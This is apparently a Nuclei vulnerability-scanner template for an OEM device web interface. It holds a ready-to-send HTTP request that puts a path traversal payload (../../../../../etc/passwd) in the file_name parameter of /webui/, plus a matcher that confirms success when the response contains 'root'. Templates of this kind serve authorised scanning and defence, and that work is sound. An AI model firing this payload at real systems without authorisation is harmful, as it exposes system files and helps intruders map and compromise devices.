id: oem-file_name-readfile

info:
  name: oem-file_name-readfile
  author: 123
  severity: medium

http:
  - raw:
      - |
        GET /webui/?file_name=../../../../../etc/passwd&g=sys_dia_data_down HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:97.0) Gecko/20100101 Firefox/97.0
        

    matchers:
      - type: dsl
        dsl:
          - 'status_code==200 && contains_all(body,"root")'